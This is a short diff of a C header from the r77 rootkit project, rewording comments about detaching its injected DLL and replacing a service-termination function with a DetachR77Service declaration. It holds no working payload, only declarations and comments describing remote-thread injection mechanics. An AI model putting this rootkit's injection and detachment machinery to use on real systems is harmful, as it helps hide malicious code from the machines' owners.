@@ -16,8 +16,7 @@ typedef struct _R77_PROCESS
 	/// </summary>
 	WORD Signature;
 	/// <summary>
-	/// A function pointer to DetachRootkit() in the remote process. This function detaches the injected r77 DLL
-	/// <para>Applies only, if Signature == R77_SIGNATURE.</para>
+	/// A function pointer that can be invoked remotely using NtCreateThreadEx to gracefully detach the injected library.
 	/// </summary>
 	DWORD64 DetachAddress;
 } R77_PROCESS, *PR77_PROCESS;
@@ -71,9 +70,12 @@ BOOL DetachInjectedProcessById(DWORD processId);
 /// </summary>
 VOID DetachAllInjectedProcesses();
 /// <summary>
-/// Terminates the r77 service process.
+/// Detaches the r77 service from its host process.
 /// </summary>
-/// <param name="excludedProcessId">A process ID that should not be terminated. Use -1 to not exclude any processes.</param>
-VOID TerminateR77Service(DWORD excludedProcessId);
+/// <returns>
+/// TRUE, if this function succeeds;
+/// otherwise, FALSE.
+/// </returns>
+BOOL DetachR77Service();
 
 #endif
